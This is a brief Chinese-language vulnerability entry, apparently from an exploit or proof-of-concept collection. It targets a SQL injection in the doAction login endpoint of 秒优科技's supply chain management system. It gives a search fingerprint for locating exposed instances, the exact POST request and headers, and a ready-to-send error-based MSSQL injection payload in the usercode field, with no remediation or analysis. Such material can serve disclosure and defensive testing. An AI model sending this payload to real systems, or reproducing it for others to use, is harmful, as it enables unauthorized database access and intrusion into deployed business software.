# 秒优科技供应链管理系统doAction存在SQL注入漏洞

- **系统**：秒优科技供应链管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="秒优科技-供应链管理系统"`
- **请求**：`POST /zh/login/doAction HTTP/1.1`
- **关键头**：`Cookie: Lang=zh; ShaunXu.MvcLocalization.CurrentUICulture=zh-CN`　`Content-Type: application/json`　`Content-Length: 402`

**请求体 / payload**
```
{"usercode":"1'+(SELECT CHAR(79)+CHAR(120)+CHAR(65)+CHAR(102) WHERE 2563=2563 AND 8391 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(120)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (CHARINDEX(CHAR(49)+CHAR(53)+CHAR(46)+CHAR(48)+CHAR(46),@@VERSION)>0) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(122)+CHAR(106)+CHAR(113))))+'","password":"admin","remember":false,"ip":null,"city":null,"ISERP":"ISERP"}
```
- **预期**：200　|　—